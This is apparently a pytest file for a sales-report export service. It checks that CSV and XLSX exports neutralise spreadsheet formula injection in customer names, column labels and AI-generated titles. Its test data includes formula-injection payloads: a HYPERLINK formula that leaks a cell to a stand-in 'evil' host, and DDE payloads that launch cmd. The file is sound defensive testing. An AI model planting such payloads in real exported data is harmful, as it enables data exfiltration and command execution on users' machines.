"""Exportações não executam fórmula vinda de dado do usuário (docs/SEGURANCA.md S-10)."""
import io

from openpyxl import load_workbook

from starrp.core.text import spreadsheet_safe
from starrp.services import report_export

EVIL = ['=HYPERLINK("https://evil/?"&A1;"Clique")', "+cmd|' /C calc'!A1", "@SUM(A1)", "-2+3+cmd|' /C calc'!A1"]


def _report():
    rows = [{"customer": text, "total": "10.00"} for text in EVIL] + [{"customer": "Ana", "total": "-12.50"}]
    return {"title": "Vendas", "subtitle": "", "period": {"from": "2026-11-01", "to": "2026-11-30"}, "kpis": [],
            "blocks": [{"type": "table", "title": "Itens", "columns": [
                {"key": "customer", "label": "Cliente"}, {"key": "total", "label": "Total", "format": "money"}],
                "rows": rows}]}


def test_csv_neutraliza_formula():
    text = report_export.to_csv(_report()).decode("utf-8-sig")
    for evil in EVIL:
        assert f'"{evil}' not in text  # nenhuma célula começa com = + - @
        assert f"\"'{evil}" in text.replace('""', '"')
    assert spreadsheet_safe("-12,50") == "-12,50"  # número não ganha apóstrofo


def test_xlsx_grava_como_texto_e_nao_como_formula():
    content = report_export.to_xlsx(_report(), {"store": None, "filters": "", "user": "Teste", "issued": "hoje"})
    book = load_workbook(io.BytesIO(content))
    cells = [cell for sheet in book.worksheets for row in sheet.iter_rows() for cell in row]
    assert not any(cell.data_type == "f" for cell in cells), [c.value for c in cells if c.data_type == "f"]
    values = {cell.value for cell in cells}
    assert set(EVIL) <= values  # o texto continua o mesmo, só não executa


def test_xlsx_titulo_e_cabecalho_vindos_do_modelo_tambem_viram_texto():
    """Rodada 1 (P-16): o título do relatório da Cosmos vem do modelo de IA."""
    report = _report()
    report["title"], report["subtitle"] = "=HYPERLINK(\"https://evil\";\"x\")", "+cmd|' /C calc'!A1"
    report["blocks"][0]["columns"][0]["label"] = "@SUM(A1)"
    book = load_workbook(io.BytesIO(report_export.to_xlsx(report, {"store": None, "filters": "", "user": "T",
                                                                    "issued": "hoje"})))
    assert not any(cell.data_type == "f" for sheet in book.worksheets for row in sheet.iter_rows() for cell in row)
